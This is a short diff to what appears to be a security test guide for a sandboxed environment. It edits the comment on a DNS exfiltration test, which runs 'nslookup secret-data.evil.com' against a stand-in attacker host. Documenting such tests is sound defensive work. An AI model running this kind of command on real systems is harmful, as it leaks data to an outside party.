@@ -174,7 +174,7 @@ curl http://kubernetes.default.svc
 # TEST: DNS exfiltration attempt (limited mitigation)
 # Note: DNS-based exfiltration is difficult to fully prevent
 nslookup secret-data.evil.com
-# Expected: May succeed - this is a known limitation documented in SECURITY.md
+# Expected: May succeed - this is a known limitation
 ```
 
 ## Running the Full Test Suite
